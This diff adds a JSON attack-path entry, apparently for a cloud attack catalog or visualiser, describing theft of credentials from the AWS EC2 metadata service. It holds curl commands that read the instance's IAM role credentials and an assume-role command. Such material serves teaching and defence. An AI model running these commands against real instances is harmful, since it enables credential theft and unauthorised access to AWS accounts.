@@ -1,0 +1,48 @@
+{
+    "title": "Exploit EC2 Instance Metadata to Gain Access",
+    "icon": "https://img.icons8.com/?size=100&id=tPXY5pOXxaOb&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "Access EC2 Metadata",
+            "icon": "https://img.icons8.com/?size=100&id=tPXY5pOXxaOb&format=png&color=000000",
+            "details": {
+                "command": "curl http://169.254.169.254/latest/meta-data/",
+                "description": "Retrieves metadata from the EC2 instance.",
+                "services": ["EC2"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Get IAM Role Credentials",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/key.png",
+            "details": {
+                "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>",
+                "description": "Retrieves IAM role credentials assigned to the EC2 instance.",
+                "services": ["EC2"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Use IAM Role Credentials",
+            "icon": "https://img.icons8.com/?size=100&id=wHPz2gYN0Ap6&format=png&color=000000",
+            "details": {
+                "command": "aws sts assume-role --role-arn <RoleArn> --role-session-name <SessionName>",
+                "description": "Uses the retrieved IAM role credentials to assume the role and gain access to AWS resources.",
+                "services": ["STS"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role.html"
+            }
+        }
+    ]
+}
